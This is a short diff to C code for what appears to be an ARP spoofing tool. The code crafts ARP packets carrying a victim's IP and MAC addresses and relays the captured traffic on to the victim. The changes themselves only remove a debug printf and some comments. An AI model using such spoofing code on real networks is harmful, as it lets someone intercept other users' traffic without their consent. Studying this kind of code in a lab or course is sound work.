@@ -68,14 +68,11 @@ void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
 		memcpy(packet + 32, d_mac, ETHER_ADDR_LEN);
 		memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address
 		
-		printf("Sender IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
-
 		pcap_sendpacket(handle, packet, packet_size);
 	}
 
-	else if (flag == 3)					//ARP_REPLY
+	else if (flag == 3)					//relay the packet
 	{
-		//Change the ethernet destination host from broadcast to victim's mac address
 		for(int i = 0; i < 6; i++)
 		{
 			eth_hdr -> ether_dhost[i] = d_mac[i];	
@@ -88,7 +85,6 @@ void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
 
 		pcap_sendpacket(handle, packet, header -> len);
 	}
-
 
 	free(eth_hdr);
 	free(arp_hdr);
